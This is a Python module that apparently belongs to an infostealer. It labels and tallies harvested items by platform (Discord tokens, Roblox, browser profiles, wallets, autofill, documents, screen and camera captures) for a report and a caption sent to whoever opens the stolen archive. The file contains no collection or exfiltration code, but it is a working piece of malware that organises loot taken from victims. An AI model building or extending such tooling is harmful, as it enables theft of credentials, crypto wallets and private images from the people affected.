"""Which platform each collected artifact belongs to.

A collector's name describes how the data was read; a platform describes what it is an
account *on*. Those are not the same axis, and the report needs both. ``browsers`` reads
five browsers and produces data from Discord, Roblox and a dozen sites; ``sessions``
reads one file and produces a Discord token. Counting items per collector answered "how
much came back" and left "who does this belong to" to whoever opened the archive.

The mapping is declared once here so the summary, the manifest and the caption all agree.
It is a label, not a filter: nothing in the collection path consults it.
"""

from __future__ import annotations

from typing import Final

# platform key -> how it is written in a report. Ordered most-specific first; ``host`` is
# the machine itself and is only correct for the system trio.
PLATFORMS: Final[dict[str, str]] = {
    "roblox": "Roblox",
    "discord": "Discord",
    "account": "Account metadata",
    "telegram": "Telegram",
    "browser": "Browser profiles",
    "wallet": "Wallets",
    "autofill": "Autofill",
    "documents": "Documents",
    "capture": "Captures",
    "host": "Host",
}

# module name -> platform key. Every module in ``layout.MODULE_DIRS`` is here; the
# contract test walks that table and fails on a module with no label.
MODULE_PLATFORM: Final[dict[str, str]] = {
    "system": "host",
    "network": "host",
    "displays": "host",
    "browsers": "browser",
    "roblox": "roblox",
    "sessions": "discord",
    "identity": "account",
    "wallets": "wallet",
    "autofill": "autofill",
    "documents": "documents",
    "screen": "capture",
    "camera": "capture",
}

# The order rows are printed in. Host first because it is the context for everything
# else, then accounts, then bulk.
_ORDER: Final[tuple[str, ...]] = (
    "host",
    "roblox",
    "discord",
    "account",
    "telegram",
    "wallet",
    "autofill",
    "browser",
    "documents",
    "capture",
)


def platform(module: str) -> str:
    """Platform key for a collector name. Unknown collectors fall back to ``host``."""
    return MODULE_PLATFORM.get(module, "host")


def label(module: str) -> str:
    """Human label for a collector name."""
    return PLATFORMS[platform(module)]


def table(counts: dict[str, int]) -> list[dict[str, object]]:
    """``[{platform, label, items, modules}]`` summed per platform, in print order.

    A module that produced nothing is still listed: "sessions: 0" is a fact, and a
    platform missing from the table reads as a platform that was not looked for.
    """
    totals: dict[str, dict[str, object]] = {}
    for module, count in counts.items():
        key = platform(module)
        row = totals.setdefault(
            key, {"platform": key, "label": PLATFORMS[key], "items": 0, "modules": []}
        )
        row["items"] = int(row["items"]) + int(count)
        modules = row["modules"]
        assert isinstance(modules, list)
        modules.append(module)

    ordered = [key for key in _ORDER if key in totals]
    ordered.extend(sorted(key for key in totals if key not in _ORDER))
    return [totals[key] for key in ordered]


def line(counts: dict[str, int]) -> str:
    """One caption line: ``host 12 | Discord 3 | Browser profiles 682``."""
    rows = [row for row in table(counts) if int(row["items"]) > 0]
    return " | ".join(f"{row['label']} {int(row['items']):,}" for row in rows)


__all__ = ["MODULE_PLATFORM", "PLATFORMS", "label", "line", "platform", "table"]
